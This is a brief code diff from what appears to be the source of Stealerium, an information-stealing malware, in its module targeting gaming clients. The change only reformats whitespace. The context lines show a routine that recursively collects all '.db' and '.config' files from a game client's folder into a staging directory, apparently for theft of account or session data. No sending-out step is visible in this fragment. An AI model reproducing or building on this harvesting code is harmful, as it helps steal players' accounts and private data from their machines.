@@ -18,7 +18,7 @@ namespace Stealerium.Target.Gaming
             {
                 Directory.CreateDirectory(sSavePath);
 
-                foreach (var found in new[] {"*.db", "*.config"})
+                foreach (var found in new[] { "*.db", "*.config" })
                 {
                     var extracted = Directory.GetFiles(Path, found, SearchOption.AllDirectories);
 
